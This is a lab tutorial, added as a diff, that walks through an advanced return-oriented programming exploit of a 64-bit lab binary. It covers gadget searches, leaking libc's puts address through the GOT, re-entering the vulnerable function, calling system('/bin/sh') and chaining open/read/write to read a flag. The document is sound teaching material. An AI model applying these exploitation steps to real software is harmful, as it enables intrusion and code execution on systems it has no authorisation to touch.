@@ -1,0 +1,345 @@
+# Tut06: Advanced ROP
+
+In the last tutorial, we leveraged the leaked code and stack pointers
+in our control hijacking attacks. 
+In this tutorial, we will exploit the _same_ program 
+without having any information leak, 
+but most importantly, in x86_64 (64-bit).
+
+## Step 0. Understanding the binary
+
+```shell
+$ checksec ./target
+[*] '/home/lab06/tut06-advrop/target'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+DEP (NX) is enabled so pages not explicitly marked as executable are not executable,
+but PIE is not enabled, meaning that ASLR is not fully enabled and the target executable's image base is not randomized.
+Note that the libraries, heap and stack are still randomized.
+Fortunately, like the previous tutorial, the canary is not placed; it
+means that we can still smash the stack
+and hijack the very first control flow.
+
+> **[Task]** Your first task is to trigger a buffer overflow and control
+> `rip`.
+
+You can control `rip` with the following payload:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> func
+  [dummy]
+  [.....] -> arg?
+```
+
+## Step 1. Controlling arguments in x86_64
+
+However, unlike x86, we can not control the arguments 
+of the invoked function
+by overwriting the stack.
+Since the target binary is built for x86_64, 
+`rdi` should instead contain the first argument.
+
+In the last tutorial, 
+we just used the `pop; ret` gadget for clearing up the stack, 
+but this can be leveraged for controlling registers.
+For example, after executing `pop rdi; ret`, 
+you are now controlling the value of a register (rdi = arg1)
+from the overwritten stack.
+
+Let's control the argument with the following payload:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ]
+  [ra   ] -> puts()
+  [ra   ]
+```
+
+Since our binary is not PIE-enabled, 
+we can still search gadgets in the code section.
+
+1) looking for the pop gadget.
+
+```shell
+$ ropper --file ./target --search "pop rdi; ret"
+...
+[INFO] File: ./target
+0x0000000000400a03: pop rdi; ret;
+```
+
+What about `puts()` of the randomized libc?
+
+2) looking for `puts()`.
+
+Although the actual implementation of `puts()` is in the libc, 
+we can still invoke `puts()` by using the resolved address 
+stored in its GOT. 
+
+Do you remember how the program invoked an external function
+via PLT/GOT, like this? In other words, we can still invoke 
+by jumping into the plt code of `puts()`:
+
+```asm
+0x00000000004006a0 <puts@plt>:
++--0x4006a0: jmp    QWORD PTR [rip+0x200972] # GOT of puts()
+|
+| (first time)
++->0x4006a6: push   0x0                    # index of puts()
+|  0x4006ab: jmp    0x400690 <.plt>        # resolve libc's puts()
+|
+| (once resolved)
++--> puts() @libc
+ 
+0x0000000000400827 <start>:
+   ...
+   400896: call   0x4006a0 <puts@plt>
+```
+
+`pwndbg` also provides an easy way to look up plt routines
+in the binary:
+
+```shell
+pwndbg> plt
+0x4006a0: puts@plt
+0x4006b0: printf@plt
+0x4006c0: memset@plt
+0x4006d0: geteuid@plt
+0x4006e0: read@plt
+0x4006f0: strcmp@plt
+0x400700: dlopen@plt
+0x400710: setreuid@plt
+0x400720: setvbuf@plt
+0x400730: dlsym@plt
+```
+
+> **[Task]** Your first task is to trigger a buffer overflow and
+> print out "Password OK :)"! This is our arbitrary read primitive.
+
+Your payload should look like:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> "Password OK :)"
+  [ra   ] -> puts@plt
+  [ra   ] (crashing)
+```
+
+
+## Step 2. Leaking libc's code pointer
+
+Although the process image has lots of interesting functions 
+that we can abuse, it misses much powerful functions 
+such as `system()` that allows us for arbitrary execution.
+To invoke arbitrary libc functions, we first need to leak 
+code pointers pointing to the libc image.
+
+Which part of the process image contains libc pointers? GOT! 
+The below code is to bridge your invocation from `puts@plt` 
+to the `puts@libc` by using the real address of `puts()` in GOT.
+
+```asm
+0x00000000004006a0 <puts@plt>:
+   0x4006a0: jmp    QWORD PTR [rip+0x200972] # GOT of puts()
+```
+
+What's the address of `puts@GOT`? It's `rip + 0x200972` so `0x4006a6 +
+0x200972 = 0x601018` (`rip` pointing to the _next_ instruction).
+
+Again, `pwndbg` provides a convenient way to look up GOT of the binary
+as well.
+
+```shell
+pwndbg> got
+
+GOT protection: Partial RELRO | GOT functions: 10
+ 
+[0x601018] puts@GLIBC_2.2.5 -> 0x7ffff78609c0 (puts) <- push r13
+[0x601020] printf@GLIBC_2.2.5 -> 0x7ffff7844e80 (printf) <- sub rsp, 0xd8
+...
+```
+> **[Task]** Let's leak the address of `puts` of libc!
+
+Your payload should look like:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> puts@got
+  [ra   ] -> puts@plt
+  [ra   ] (crashing)
+```
+
+Note that the output of `puts()` might not be 8 bytes (64-bit
+pointer), as its address contains multiple _zeros_ (i.e., NULL-byte for `puts()`)
+in the most significant bytes.
+
+
+## Step 3. Preparing Second Payload
+
+Now what? We can calculate the base of libc from the leaked `puts()`, 
+so we can invoke all functions in libc? Perhaps, like below:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> puts@got
+  [ra   ] -> puts@plt
+
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> "/bin/sh"@libc
+  [ra   ] -> system()@libc
+  [ra   ] (crashing)
+```
+
+In fact, when you are preparing the payload, you don't know 
+the address of libc; the payload leaking the `puts@GOT` is
+not yet executed.
+
+Among all the places we know, is there any place 
+we can continue to interact with the process? 
+Yes, the `start()` function! 
+Our plan is to execute `start()`,
+resolve the address of libc,
+and smashing the stack once more.
+
+> **[Task]** Jump to `start()` that has the stack overflow.
+> Make sure that you indeed see the program banner once more!
+
+```c
+payload1:
+
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> puts@got
+  [ra   ] -> puts@plt
+
+  [ra   ] -> start
+```
+
+The program is now executing the vulnerable `start()` once more,
+and waiting for your input. It's time to ROP once more to invoke
+`system()` with the resolved addresses.
+
+> **[Task]** Invoke `system("/bin/sh")`!
+
+```c
+payload2:
+
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> "/bin/sh"
+  [ra   ] -> system@libc
+```
+
+## Step 4. Advanced ROP: Chaining multiple functions!
+
+Similar to the last tutorial, 
+we will invoke a sequence of calls 
+to read the flag.
+
+```c
+(assume: symlinked anystring -> /proc/flag)
+
+1) open("anystring", 0)
+2) read(3, tmp, 1040)
+3) write(1, tmp, 1040)
+```
+
+1) Invoking `open()`
+
+To control the second argument, we need a gadget that pops `rsi` 
+(pointing to the second argument in x86_64) and returns.
+
+```shell
+$ ropper --file ./target --search 'pop rsi; ret'
+<.. Nop ..>
+```
+
+Although the target binary doesn't have the `pop rsi; ret` but 
+there is one effectively identical.
+
+```shell
+$ ropper --file ./target --search 'pop rsi; pop %; ret'
+...
+0x0000000000400a01: pop rsi; pop r15; ret;
+```
+
+So invoking `open()` is pretty doable:
+
+```c
+payload2:
+
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> "anystring`
+
+  [ra   ] -> pop rsi; pop r15; ret
+  [arg2 ] -> 0
+  [dummy] (r15)
+  
+  [ra   ] -> open() 
+```
+
+2) Invoking `read()`
+
+To invoke `read()`, we need one more gadget to control
+its third argument: `pop rdx; ret`. Unfortunately, the target binary 
+doesn't have a proper gadget available.
+
+What should we do? In fact, at this point, 
+we know the address of the `libc` image and
+we can chain the rop by using its gadget! 
+
+```shell
+$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdx; ret'
+0x0000000000001b96: pop rdx; ret;
+...
+```
+
+Your payload should like this:
+
+```c
+payload2:
+
+  [buf  ]
+  [.....]
+  [ra   ] -> pop rdi; ret
+  [arg1 ] -> 3
+
+  [ra   ] -> pop rsi; pop r15; ret
+  [arg2 ] -> tmp
+  [dummy] (r15)
+
+  [ra   ] -> pop rdx; ret
+  [arg3 ] -> 1040
+  
+  [ra   ] -> read()
+```
+
+> **[Task]** Your final task is to chain open/read/write, 
+> and get the real flag from `target-seccomp`!
+
+What if either PIE or ssp (stack canary) is enabled? Do you
+think we can exploit this vulnerability?
+
+
+## Reference
+
+- [System V AMD64 ABI](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI)
+- [Introduction to x64 Assembly](https://software.intel.com/en-us/articles/introduction-to-x64-assembly)
